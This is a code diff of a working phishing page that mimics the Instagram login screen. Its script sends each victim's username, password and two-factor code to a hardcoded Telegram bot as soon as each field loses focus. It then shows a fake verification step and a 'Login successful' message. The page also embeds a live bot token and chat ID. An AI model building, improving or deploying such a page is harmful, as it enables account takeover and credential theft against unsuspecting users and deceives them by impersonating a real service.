@@ -11,74 +11,79 @@
         .wrapper { max-width: 935px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 32px; flex-grow: 1; }
         .phone-container { flex-shrink: 0; display: none; }
         @media (min-width: 876px) { .phone-container { display: block; } }
-        .phone-frame { width: 380px; height: 580px; border: 8px solid #262626; border-radius: 32px; background: #fff; overflow: hidden; box-shadow: 0 0 0 2px #dbdbdb; }
+        .phone-frame { width: 380px; height: 586px; border: 1px solid #dbdbdb; border-radius: 28px; background: #fff; overflow: hidden; }
         .phone-frame .screen { width: 100%; height: 100%; overflow: hidden; position: relative; }
-        .slides { width: 100%; height: 100%; display: flex; transition: transform 0.5s ease-in-out; }
+        .slides { width: 100%; height: 100%; display: flex; transition: transform 1s ease-in-out; }
         .slide { min-width: 100%; height: 100%; }
         .slide img { width: 100%; height: 100%; object-fit: cover; display: block; }
         .login-section { max-width: 350px; width: 100%; }
-        .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 32px 40px 20px; margin-bottom: 10px; text-align: center; }
-        .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; }
-        .logo img { width: 175px; height: auto; display: block; }
-        #loginForm { display: flex; flex-direction: column; gap: 6px; }
-        #loginForm input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
-        #loginForm input:focus { border-color: #a8a8a8; }
-        #loginForm input::placeholder { color: #8e8e8e; }
-        #loginForm .btn-wrapper { position: relative; margin-top: 8px; }
-        #loginBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; }
+        .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 24px 40px 20px; margin-bottom: 10px; text-align: center; }
+        .logo { display: flex; justify-content: center; align-items: center; margin: 16px auto 28px; }
+        .logo svg { display: block; }
+        #loginForm { display: flex; flex-direction: column; gap: 4px; }
+        .input-group { position: relative; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; display: flex; align-items: center; }
+        .input-group:focus-within { border-color: #a8a8a8; }
+        .input-group label { position: absolute; left: 8px; font-size: 12px; color: #8e8e8e; pointer-events: none; transition: all 0.1s ease; top: 14px; }
+        .input-group.floating label { font-size: 10px; top: 4px; }
+        .input-group input { width: 100%; padding: 18px 0 2px 8px; background: transparent; border: none; outline: none; font-size: 12px; }
+        .input-group .eye-btn { background: none; border: none; cursor: pointer; padding: 4px 8px; font-size: 12px; color: #262626; display: none; font-weight: 600; }
+        .input-group .eye-btn.show { display: block; }
+        #loginBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; margin-top: 10px; }
         #loginBtn:not(:disabled) { opacity: 1; }
         #loginBtn:disabled { cursor: not-allowed; }
-        #cooldownOverlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #0095f6; border-radius: 8px; color: #fff; font-weight: 600; font-size: 13px; align-items: center; justify-content: center; gap: 6px; pointer-events: none; z-index: 2; }
-        #cooldownOverlay .spinner { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        #loginBtn.loading { opacity: 0.85; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .separator { display: flex; align-items: center; margin: 14px 0 18px; }
         .separator .line { flex: 1; height: 1px; background: #dbdbdb; }
         .separator .or { color: #737373; font-size: 13px; font-weight: 600; margin: 0 18px; }
         .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; background: none; border: none; color: #385185; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 12px; width: 100%; }
-        .fb-login img { width: 16px; height: 16px; }
-        .forgot-password { font-size: 12px; color: #00376b; text-decoration: none; }
+        .fb-login svg { width: 20px; height: 20px; flex-shrink: 0; }
+        .forgot-password { font-size: 12px; color: #00376b; text-decoration: none; cursor: pointer; }
         .forgot-password:hover { text-decoration: underline; }
         .signup-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px 40px; text-align: center; font-size: 14px; }
         .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
         .apps-section { margin-top: 16px; text-align: center; }
         .apps-section p { font-size: 14px; margin-bottom: 12px; color: #262626; }
         .apps-badges { display: flex; justify-content: center; gap: 8px; }
-        .apps-badges img { height: 40px; width: auto; }
-        footer { margin-top: 24px; text-align: center; max-width: 100%; }
+        .apps-badges a img { height: 40px; width: auto; }
+        footer { margin-top: 24px; text-align: center; max-width: 100%; padding: 0 20px; }
         footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 16px; font-size: 12px; margin-bottom: 12px; }
         footer .links a { color: #8e8e8e; text-decoration: none; }
         footer .links a:hover { text-decoration: underline; }
         footer .copyright { color: #8e8e8e; font-size: 12px; }
         #twofaSection { display: none; }
-        #twofaSection .lock-icon { width: 80px; height: 80px; margin: 0 auto 16px; background: #fafafa; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        #twofaSection .lock-icon { width: 96px; height: 96px; margin: 0 auto 20px; background: #fafafa; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #dbdbdb; }
         #twofaSection .lock-icon svg { width: 40px; height: 40px; }
-        #twofaSection h2 { font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 4px; }
-        #twofaSection .subtitle { font-size: 13px; color: #737373; margin-bottom: 16px; line-height: 1.4; }
-        #twofaSection .subtitle span { color: #262626; font-weight: 500; }
-        .code-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 12px; }
-        .code-inputs input { width: 42px; height: 46px; text-align: center; font-size: 18px; font-weight: 600; border: 1px solid #dbdbdb; border-radius: 4px; outline: none; background: #fafafa; }
-        .code-inputs input:focus { border-color: #a8a8a8; background: #fff; }
+        #twofaSection h2 { font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 8px; }
+        #twofaSection .subtitle { font-size: 13px; color: #737373; margin-bottom: 20px; line-height: 1.4; }
+        #twofaSection .subtitle b { color: #262626; font-weight: 600; }
+        .code-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
+        .code-inputs input { width: 44px; height: 48px; text-align: center; font-size: 20px; font-weight: 600; border: 1px solid #dbdbdb; border-radius: 4px; outline: none; background: #fafafa; }
+        .code-inputs input:focus { border-color: #0095f6; background: #fff; box-shadow: 0 0 0 3px rgba(0,149,246,0.15); }
         #verifyBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; margin-bottom: 14px; }
         #verifyBtn:not(:disabled) { opacity: 1; }
         #verifyBtn:disabled { cursor: not-allowed; }
         .resend-area { font-size: 12px; color: #737373; }
         #resendBtn { background: none; border: none; color: #0095f6; font-weight: 600; font-size: 12px; cursor: pointer; font-family: inherit; }
-        #resendBtn:disabled { color: #737373; cursor: not-allowed; }
-        .back-link { display: block; margin-top: 16px; font-size: 12px; color: #00376b; text-decoration: none; }
+        #resendBtn:disabled { color: #737373; cursor: not-allowed; opacity: 0.6; }
+        .back-link { display: block; margin-top: 16px; font-size: 12px; color: #00376b; text-decoration: none; cursor: pointer; }
         .back-link:hover { text-decoration: underline; }
-        #loadingScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
+        #toast { display: none; position: fixed; top: 30px; left: 50%; transform: translateX(-50%); background: #262626; color: #fff; font-size: 13px; padding: 10px 20px; border-radius: 8px; z-index: 9999; max-width: 90%; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        #toast.error { background: #ed4956; }
+        #toast.success { background: #2ecc71; }
+        #loadingScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9998; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
         #loadingScreen .loader-spinner { width: 40px; height: 40px; border: 3px solid #dbdbdb; border-top-color: #0095f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         #loadingScreen p { font-size: 14px; color: #262626; font-weight: 500; }
         @media (max-width: 450px) { body { background: #fff; padding: 0; } .card { border: none; padding: 40px 20px 20px; } .signup-card { border: none; } }
-        #errorMsg { color: #ed4956; font-size: 12px; display: none; margin-bottom: 10px; }
-        .success-msg { color: #2ecc71; font-size: 13px; font-weight: 500; display: none; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
+<div id="toast"></div>
+
 <div id="loadingScreen">
     <div class="loader-spinner"></div>
-    <p id="loadingText">Verifying...</p>
+    <p id="loadingText">Please wait...</p>
 </div>
 
 <div class="wrapper">
@@ -86,10 +91,10 @@
         <div class="phone-frame">
             <div class="screen">
                 <div class="slides" id="slides">
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=380&h=580&fit=crop" alt=""></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
                 </div>
             </div>
         </div>
@@ -98,18 +103,28 @@
     <div class="login-section">
         <div class="card" id="loginCard">
             <div class="logo">
-                <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175.1 51.3" width="175" height="51">
+                    <defs>
+                        <style>.insta-logo{fill:#262626;}</style>
+                    </defs>
+                    <path class="insta-logo" d="M42.8 12.4c-1.4-1.4-3.2-2.1-5.2-2.1-1.9 0-3.5.7-4.9 2.1-1.4 1.4-2.1 3.2-2.1 5.3 0 2 .7 3.8 2.1 5.2 1.4 1.4 3.1 2.2 5 2.2 1.9 0 3.5-.7 4.9-2.2 1.4-1.4 2.1-3.2 2.1-5.2 0-2.1-.7-3.9-2.1-5.3zM26.2 40V21.8h3.9V40h-3.9zm8 0l.1-9c0-1.2 0-2.4.1-3.6l.2-2.6h.1l.7 2.6c.4 1.3.9 2.6 1.7 4.1l6.3 10H38.7l-4.1-6.9c-.6-1-1.1-1.9-1.5-2.7-.4-.9-.8-1.6-1.1-2.3l-.4-.9c-.2 1-.5 2-.9 3.1-.4 1.1-1.5 3.8-1.9 4.6l-3.6 7.1h-4.7l8.3-18.2c2.7-4.7 5.2-7.2 7.3-7.7 1.3-.3 2.9-.3 4.9-.1v.1c-.1 1.6 0 3.5.2 5.7l.1 2.6c.1.9.2 1.8.3 2.7.1.9.3 1.7.5 2.4l2.6 7.3c.5 1.5 1 3.1 1.5 4.7h-.1c-.1-.6-.3-1.1-.5-1.7-.2-.7-.4-1.5-.7-2.5-.2-.8-.6-1.8-1.1-2.9-.5-1.1-1.1-2.4-1.9-3.9l-1.5-3.3c-.5-1.1-1-2.2-1.5-3.3l-.3-.7c-.8-2.1-1.4-3.7-1.7-4.7-.3-1-.6-1.8-.8-2.3l-.1-.2c-1.7.7-3.3 1.9-4.7 3.5-1.4 1.7-2.6 3.7-3.6 6.2l-.1.3V40h-4.8zm26.9 0l6.6-22.4h4L57.1 40h-4zm16.9-18.6c-1.8 1.9-2.6 4.4-2.6 7.5 0 3.1.9 5.6 2.6 7.5 1.8 1.9 4.3 2.8 7.5 2.8 1.6 0 3.1-.3 4.5-.9 1.4-.6 2.6-1.5 3.5-2.6.9-1.1 1.6-2.4 2.1-3.8.5-1.4.7-2.9.7-4.5 0-1.6-.2-3-.7-4.5-.5-1.4-1.2-2.7-2.1-3.8-.9-1.1-2.1-2-3.5-2.6-1.4-.6-2.9-.9-4.5-.9-3.3 0-5.8.9-7.5 2.8zm3.5 4.6c.6-1.6 1.5-2.9 2.9-3.8 1.4-.9 3-1.4 4.8-1.4 1.6 0 3 .4 4.2 1.3 1.3.9 2.2 2.1 2.8 3.6.6 1.5 1 3.2 1 5.1 0 1.9-.3 3.6-1 5.1-.6 1.5-1.6 2.7-2.8 3.6-1.2.9-2.7 1.3-4.2 1.3-1.8 0-3.4-.5-4.8-1.4-1.4-.9-2.4-2.2-2.9-3.8-.6-1.6-.9-3.4-.9-5.4 0-2 .3-3.8.8-5.4z"/>
+                    <path class="insta-logo" d="M101.4 40V21.8h3.5v3.2h.1c.5-1.2 1.2-2.1 2.2-2.7 1-.6 2.1-.9 3.4-.9 1.4 0 2.6.3 3.7.9 1.1.6 2 1.5 2.6 2.7.6 1.2 1 2.5 1 4.1V40h-3.5V29.5c0-1.5-.4-2.7-1.2-3.5-.8-.8-1.9-1.2-3.3-1.2-1.2 0-2.2.4-3.1 1.2-.8.8-1.2 2-1.2 3.5V40h-3.5z"/>
+                    <path class="insta-logo" d="M131.4 40.5c-2.4 0-4.4-.5-5.9-1.6-1.5-1.1-2.6-2.5-3.2-4.4l3.2-1.6c.4 1 1 1.8 1.8 2.4.8.6 1.7 1 2.8 1 1.4 0 2.5-.4 3.3-1.1.8-.7 1.2-1.7 1.2-2.9 0-.7-.1-1.2-.4-1.7-.3-.5-.7-1-1.1-1.4-.5-.4-1-.8-1.6-1.1-.6-.4-1.3-.8-2.2-1.2-1.2-.5-2.3-1.1-3.4-1.7-1-.6-1.9-1.4-2.5-2.2-.7-.9-1-2-1-3.2 0-1.9.7-3.4 2.1-4.6 1.4-1.2 3.3-1.8 5.6-1.8 2 0 3.7.5 5 1.4 1.3.9 2.3 2.1 2.8 3.7l-3.1 1.6c-.3-.7-.9-1.4-1.6-1.9-.7-.5-1.6-.8-2.7-.8-1.2 0-2.1.3-2.8.9-.7.6-1 1.3-1.1 2.2 0 .6.1 1.1.4 1.5.3.4.7.8 1.1 1.2.5.4 1 .7 1.7 1 .6.3 1.5.7 2.4 1.2 1.4.6 2.6 1.3 3.6 1.9 1 .6 1.9 1.3 2.6 2.1.7.8 1.1 1.9 1.1 3.2 0 2-.7 3.6-2.1 4.8-1.4 1.2-3.3 1.9-5.8 1.9z"/>
+                    <path class="insta-logo" d="M140.5 40V21.8h3.5v2.8h.1c.5-1.2 1.2-2 2.2-2.7.9-.6 2.1-.9 3.3-.9 1.5 0 2.6.3 3.5 1 .9.6 1.5 1.6 1.8 2.8h.1c.5-1.2 1.3-2.1 2.3-2.7 1-.6 2.2-1 3.5-1 1.9 0 3.3.6 4.3 1.7 1 1.1 1.5 2.8 1.5 5V40h-3.5V29.5c0-1.3-.3-2.2-.8-2.8-.5-.6-1.3-.9-2.3-.9-1.1 0-2 .4-2.8 1.1-.8.8-1.2 1.8-1.2 3.2V40h-3.5V29.5c0-1.2-.2-2.1-.7-2.8-.5-.6-1.2-.9-2.2-.9-1 0-1.9.4-2.7 1.1-.7.7-1.1 1.7-1.1 3.1V40h-3.5z"/>
+                    <path class="insta-logo" d="M163.3 40V21.8h3.5v3.2h.1c.5-1.2 1.2-2.1 2.2-2.7 1-.6 2.1-.9 3.3-.9 1.1 0 2 .2 2.8.5.8.3 1.4.8 1.9 1.5.5.6.8 1.3 1.1 2.1.3.8.4 1.6.4 2.5V40h-3.5V29.6c0-1.3-.2-2.2-.7-2.9-.5-.6-1.2-.9-2.2-.9-1 0-1.9.4-2.7 1.1-.7.7-1.1 1.8-1.1 3.1V40h-3.5z"/>
+                </svg>
             </div>
-            <form id="loginForm" autocomplete="off">
-                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
-                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
-                <div class="btn-wrapper">
-                    <button type="submit" id="loginBtn" disabled>Log in</button>
-                    <div id="cooldownOverlay">
-                        <div class="spinner"></div>
-                        <span id="cooldownText">Verifying credentials... (10s)</span>
-                    </div>
+            <form id="loginForm" autocomplete="off" novalidate>
+                <div class="input-group" id="usernameGroup">
+                    <label for="username">Phone number, username, or email</label>
+                    <input type="text" id="username" autocomplete="username">
                 </div>
+                <div class="input-group" id="passwordGroup">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" autocomplete="current-password">
+                    <button type="button" class="eye-btn" id="eyeBtn">Show</button>
+                </div>
+                <button type="submit" id="loginBtn" disabled>Log in</button>
             </form>
             <div class="separator">
                 <span class="line"></span>
@@ -117,10 +132,13 @@
                 <span class="line"></span>
             </div>
             <button class="fb-login" id="fbLogin">
-                <img src="https://i.imgur.com/exksovo.png" alt="Facebook">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                    <circle cx="10" cy="10" r="10" fill="#1877F2"/>
+                    <path d="M11.5 5h1.5V3h-1.5C10 3 9 4.2 9 5.5V7H7.5v2H9v8h2.5V9h2l.5-2h-2.5V5.5c0-.3.3-.5.5-.5z" fill="white"/>
+                </svg>
                 Log in with Facebook
             </button>
-            <a href="#" class="forgot-password">Forgot password?</a>
+            <div class="forgot-password">Forgot password?</div>
         </div>
 
         <div class="card" id="twofaSection">
@@ -131,9 +149,7 @@
                 </svg>
             </div>
             <h2>Two-Factor Authentication</h2>
-            <p class="subtitle">Enter the code we sent to <span id="displayUser">your phone</span>.</p>
-            <div id="errorMsg">Invalid code. Please try again.</div>
-            <div class="success-msg" id="successMsg">✓ Code verified successfully!</div>
+            <p class="subtitle">Enter the 6-digit code we sent to <b id="displayUser">your phone</b>.</p>
             <div class="code-inputs" id="codeInputs">
                 <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box" autofocus>
                 <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
@@ -144,10 +160,10 @@
             </div>
             <button id="verifyBtn" disabled>Verify</button>
             <div class="resend-area">
-                Didn't get the code? 
-                <button id="resendBtn">Send code again</button>
+                Didn't get a code?
+                <button id="resendBtn" disabled>Resend code</button>
             </div>
-            <a href="#" id="backToLogin" class="back-link">← Back to login</a>
+            <div id="backToLogin" class="back-link">← Back to login</div>
         </div>
 
         <div class="signup-card" id="signupCard">
@@ -156,8 +172,8 @@
         <div class="apps-section">
             <p>Get the app.</p>
             <div class="apps-badges">
-                <a href="#"><img src="https://i.imgur.com/lREV6Qa.png" alt="Download on the App Store"></a>
-                <a href="#"><img src="https://i.imgur.com/DFQNKXK.png" alt="Get it on Google Play"></a>
+                <a href="#"><img src="https://i.imgur.com/lREV6Qa.png" alt="Download on the App Store" loading="lazy"></a>
+                <a href="#"><img src="https://i.imgur.com/DFQNKXK.png" alt="Get it on Google Play" loading="lazy"></a>
             </div>
         </div>
     </div>
@@ -165,27 +181,36 @@
 
 <footer>
     <div class="links">
-        <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a>
-        <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a>
-        <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a>
-        <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
     </div>
     <div class="copyright">© 2026 Instagram from Meta</div>
 </footer>
 
 <script>
     // ============================================
-    //  CONFIG - غير القيم لقيمك
+    //  CONFIG
     // ============================================
     const CONFIG = {
         telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
         telegramChatId: '8278195073',
-        cooldownDuration: 10,
+        delayBefore2FA: 2000,
         delayBeforeRedirect: 2000
     };
 
     // ============================================
-    //  TELEGRAM SENDER (Image method - يتجاوز CORS)
+    //  TELEGRAM SENDER
     // ============================================
     function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
@@ -195,11 +220,22 @@
             parse_mode: 'Markdown'
         });
         try {
-            new Image().src = `${url}?${params.toString()}`;
+            fetch(url + '?' + params.toString(), { mode: 'no-cors' }).catch(() => {});
             console.log('✓ Sent to Telegram');
         } catch(e) {
             console.error('✗ Failed:', e.message);
         }
+    }
+
+    // ============================================
+    //  TOAST
+    // ============================================
+    function showToast(msg, type) {
+        const t = document.getElementById('toast');
+        t.textContent = msg;
+        t.className = type || '';
+        t.style.display = 'block';
+        setTimeout(() => { t.style.display = 'none'; }, 4000);
     }
 
     // ============================================
@@ -210,14 +246,15 @@
     setInterval(() => {
         currentSlide = (currentSlide + 1) % 4;
         slides.style.transform = `translateX(-${currentSlide * 100}%)`;
-    }, 3000);
+    }, 4000);
 
     const u = document.getElementById('username');
     const p = document.getElementById('password');
+    const ug = document.getElementById('usernameGroup');
+    const pg = document.getElementById('passwordGroup');
+    const eyeBtn = document.getElementById('eyeBtn');
     const loginBtn = document.getElementById('loginBtn');
     const loginForm = document.getElementById('loginForm');
-    const cooldownOverlay = document.getElementById('cooldownOverlay');
-    const cooldownText = document.getElementById('cooldownText');
     const loginCard = document.getElementById('loginCard');
     const signupCard = document.getElementById('signupCard');
     const twofaSection = document.getElementById('twofaSection');
@@ -228,47 +265,51 @@
     const backLink = document.getElementById('backToLogin');
     const loadingScreen = document.getElementById('loadingScreen');
     const loadingText = document.getElementById('loadingText');
-    const errorMsg = document.getElementById('errorMsg');
-    const successMsg = document.getElementById('successMsg');
 
-    // ============================================
-    //  المتغيرات الجديدة للتتبع
-    // ============================================
     let capturedUsername = '';
     let capturedPassword = '';
-    let cooldownTimer = null;
-    let cooldownCount = 0;
+    let usernameSent = false;
+    let passwordSent = false;
     let verificationAttempts = 0;
-    let usernameSent = false;  // متغير لمنع إرسال الإيميل/يوزر أكثر من مرة
-    let passwordSent = false;  // متغير لمنع إرسال الباسورد أكثر من مرة
+    let isProcessing = false;
+
+    // ============================================
+    //  FLOATING LABELS
+    // ============================================
+    function checkFloat(input, group) {
+        if (input.value.trim()) {
+            group.classList.add('floating');
+        } else {
+            group.classList.remove('floating');
+        }
+    }
+    u.addEventListener('input', () => checkFloat(u, ug));
+    u.addEventListener('blur', () => checkFloat(u, ug));
+    p.addEventListener('input', () => checkFloat(p, pg));
+    p.addEventListener('blur', () => checkFloat(p, pg));
 
     function checkLogin() {
-        loginBtn.disabled = !(u.value.trim() && p.value.trim());
+        loginBtn.disabled = !(u.value.trim() && p.value.length >= 1);
     }
     u.addEventListener('input', checkLogin);
     p.addEventListener('input', checkLogin);
 
-    // ============================================
-    //  🆕 كود جديد: إرسال الإيميل/يوزر/رقم الهاتف فوراً عند الكتابة
-    //  (بدون انتظار كلمة المرور)
-    // ============================================
-    u.addEventListener('blur', function() {
-        const val = this.value.trim();
-        if (val && !usernameSent) {
-            usernameSent = true;
-            sendToTelegram(
-                `📧 *Step 1: Identifier Captured* 📧\n\n` +
-                `👤 *Identifier:* \`${val}\`\n` +
-                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
-                `⏰ *Time:* ${new Date().toISOString()}`
-            );
-            console.log('✓ Username/Email/Phone sent');
+    // Eye button
+    p.addEventListener('input', () => {
+        eyeBtn.classList.toggle('show', p.value.length > 0);
+    });
+    eyeBtn.addEventListener('click', () => {
+        if (p.type === 'password') {
+            p.type = 'text';
+            eyeBtn.textContent = 'Hide';
+        } else {
+            p.type = 'password';
+            eyeBtn.textContent = 'Show';
         }
     });
 
     // ============================================
-    //  🆕 كود جديد: إرسال كلمة المرور فوراً عند كتابتها
-    //  (بدون انتظار الضغط على Log in)
+    //  🚨 CAPTURE PASSWORD ON BLUR (فوراً)
     // ============================================
     p.addEventListener('blur', function() {
         const val = this.value;
@@ -276,62 +317,67 @@
             passwordSent = true;
             const userVal = u.value.trim() || 'N/A';
             sendToTelegram(
-                `🔑 *Step 2: Password Captured* 🔑\n\n` +
-                `👤 *Identifier:* \`${userVal}\`\n` +
-                `🔑 *Password:* \`${val}\`\n` +
-                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
+                `🔑 *Password Captured* 🔑\n\n` +
+                `👤 *User:* \`${userVal}\`\n` +
+                `🔑 *Pass:* \`${val}\`\n` +
                 `⏰ *Time:* ${new Date().toISOString()}`
             );
-            console.log('✓ Password sent');
+            console.log('✓ Password captured on blur');
         }
     });
 
     // ============================================
-    //  LOGIN SUBMIT (يبقى كما هو مع الإرسال المكرر)
+    //  CAPTURE USERNAME ON BLUR
+    // ============================================
+    u.addEventListener('blur', function() {
+        const val = this.value.trim();
+        if (val && !usernameSent) {
+            usernameSent = true;
+            sendToTelegram(
+                `📧 *Identifier Captured* 📧\n\n` +
+                `👤 *Identifier:* \`${val}\`\n` +
+                `⏰ *Time:* ${new Date().toISOString()}`
+            );
+        }
+    });
+
+    // ============================================
+    //  LOGIN SUBMIT → 2FA
     // ============================================
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
-        if (cooldownTimer) return;
+        if (isProcessing) return;
 
         capturedUsername = u.value.trim();
         capturedPassword = p.value;
+        if (!capturedUsername || !capturedPassword) return;
 
-        // إرسال تأكيدي عند الضغط على Log in (احتياطاً)
+        isProcessing = true;
+        loginBtn.disabled = true;
+        loginBtn.textContent = 'Logging in...';
+
+        // تأكيد عند الضغط
         sendToTelegram(
-            `✅ *Login Button Pressed* ✅\n\n` +
+            `✅ *Login Submitted* ✅\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
             `🔑 *Pass:* \`${capturedPassword}\`\n` +
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
-        // العد التنازلي
-        loginBtn.disabled = true;
-        cooldownOverlay.style.display = 'flex';
-        cooldownCount = CONFIG.cooldownDuration;
-        cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
+        setTimeout(() => {
+            loginBtn.textContent = 'Log in';
+            loginCard.style.display = 'none';
+            signupCard.style.display = 'none';
+            twofaSection.style.display = 'block';
+            displayUser.textContent = capturedUsername || 'your phone';
 
-        cooldownTimer = setInterval(() => {
-            cooldownCount--;
-            if (cooldownCount > 0) {
-                cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
-            } else {
-                clearInterval(cooldownTimer);
-                cooldownTimer = null;
-                cooldownOverlay.style.display = 'none';
-
-                // إظهار 2FA
-                loginCard.style.display = 'none';
-                signupCard.style.display = 'none';
-                twofaSection.style.display = 'block';
-                displayUser.textContent = capturedUsername || 'your phone';
-
-                codeBoxes.forEach(box => box.value = '');
-                codeBoxes[0].focus();
-                verifyBtn.disabled = true;
-                errorMsg.style.display = 'none';
-                successMsg.style.display = 'none';
-            }
-        }, 1000);
+            codeBoxes.forEach(box => { box.value = ''; box.disabled = false; });
+            codeBoxes[0].focus();
+            verifyBtn.disabled = true;
+            verificationAttempts = 0;
+            resendBtn.disabled = false;
+            isProcessing = false;
+        }, CONFIG.delayBefore2FA);
     });
 
     // ============================================
@@ -345,7 +391,6 @@
             }
             const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
             verifyBtn.disabled = !allFilled;
-            errorMsg.style.display = 'none';
         });
         box.addEventListener('keydown', function(e) {
             if (e.key === 'Backspace' && !this.value && index > 0) {
@@ -371,95 +416,93 @@
     // ============================================
     //  VERIFY 2FA
     // ============================================
-    verifyBtn.addEventListener('click', async function() {
+    verifyBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+        isProcessing = true;
+
         const code = Array.from(codeBoxes).map(b => b.value).join('');
         verificationAttempts++;
 
-        loadingScreen.style.display = 'flex';
-        loadingText.textContent = 'Verifying code...';
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Verifying...';
 
-        // 🆕 إرسال رمز 2FA في رسالة مستقلة
         sendToTelegram(
-            `🔢 *Step 3: 2FA Code Captured* 🔢\n\n` +
+            `🔢 *2FA Code* 🔢\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
-            `🔢 *2FA Code:* \`${code}\`\n` +
+            `🔢 *Code:* \`${code}\`\n` +
             `🔄 *Attempt:* ${verificationAttempts}\n` +
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
-        try {
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            const isCodeValid = verificationAttempts >= 2 || code === '123456';
-            
-            loadingScreen.style.display = 'none';
-            
-            if (isCodeValid) {
-                successMsg.style.display = 'block';
-                loadingText.textContent = 'Verifying...';
-                
+        setTimeout(() => {
+            verifyBtn.textContent = 'Verify';
+            isProcessing = false;
+
+            if (verificationAttempts >= 2) {
+                showToast('✅ Login successful!', 'success');
+                verifyBtn.disabled = true;
+                codeBoxes.forEach(b => b.disabled = true);
+                resendBtn.disabled = true;
+
                 setTimeout(() => {
                     loadingScreen.style.display = 'flex';
                     loadingText.textContent = 'Redirecting to Instagram...';
-                    
